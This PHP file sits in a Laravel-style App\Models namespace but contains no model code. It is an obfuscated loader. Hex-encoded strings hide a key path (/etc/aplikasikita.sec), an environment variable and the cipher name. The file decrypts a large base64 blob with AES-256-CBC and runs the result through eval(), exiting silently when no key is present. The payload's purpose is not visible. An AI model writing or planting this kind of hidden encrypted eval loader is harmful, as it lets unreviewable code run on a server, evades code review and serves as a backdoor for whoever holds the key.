<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('j2rrC3Xe+Q7LlS7V4iLiZQ==');
$c=base64_decode(
'hJ+Bdy6oq5yQHspAieeriCko3DE5GoNKWgoheutLNOAV/X5zEEeShjLZz59jamQMQF8YQyNE5KGg' .
'k/bY+rz6kKGSVoPxABOv/evTJt3K4IgvrHR2SLfl9j9kImfop2WCXNWd+CVNlSnVl4Rw94TxJbGZ' .
'/JgBm/sGd1KJu7/2VhyVn107eM1vguSyUYzUH7oKaVQmUAJRYzGB1TzHEsuIBZ4wgmjtdHTHpn8T' .
'Bvp3cTdQa51VsGzWU+JtbtnWreIStpdW7TYa+a86QsiEpNX7JxNALBCeLI7gbdRiLYTHlLOWy5lL' .
'OJDvdnk9T1EPsSQfp4znMcpt+WHRLjV0vK8CpJIPVfQ98ERHEBLSJ7eIYYgVGWhjFYr+J+u2KQYN' .
'OkFmKPDWrEx3SN9IDTVavQ+i1/KVJNXwka8AAIu7CxcZkDkdB96ufTnx0nHL/w0l5OVSLT7pBAf5' .
'NGvmrS3GwNl8x39Kc+/C13QCD7GadS+kM0ZrA9qAaNR52PTmPukZ0JuN3fZZV0nEmJl5QII07PIo' .
'jt+bGzQk1a9GQdu2QvaqV8WF96WVe1vQJTmzsYejH9BZgAsmoxr6vLBfe+4tYBj+G+VQwDii67ch' .
'iGAsYrshf8Hx1cUnUpAQRKH1510gQdHMwoafTm1+cXfnmayQj2nR7PS/3h1K9yG0QC8XN3193pkK' .
'48BXF3RD4CpFFS1lYp63Z2Qlcci70T8RQDZkM0wze9H17KX6vPdGW9uu+V5TqxY3MDJ3Pp6Wuv1U' .
'vLkeKpvtbIdL5LLdhvVyym+rKqNziHgGB88AqOxSqAa7Wpy8GJWvsFBg6SGjdQBPaXUZkU5I5B1V' .
'V20+oRO55ZecRiHmCayYINGmFXAc6AmGDFptoocVvEtBiotRuJ7D5heEUlb/k5pJjMOYIUpbl4kj' .
'IjZpuMhkUZ5YbWHm77j8PZvM+dkv3uLYlTl0s0NofqjVHbaizt9Cq8HwtsfbnHqIlMOIgROCmJ3R' .
'ef7ycGVcoSsOMsytH789TLS7glbw4GikGWWwtjOMdoiqQrkI04dKRchcjc3hrs/XC7HWAQJBdUns' .
'KDUW1w5/h/4DtUQGTMwXyWpb5bdwIcf7Y7spby67MEHYg1g8YcFmGBjmlmNE+KaNV83o+JmOZNvA' .
'pCG/PxwzvZTbnL58jPDRyHIdPyy6PAKhwzI5btYgG9YrRbSyfYAcP4ZxnCGAbkikpkTPaTlGJmoq'
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
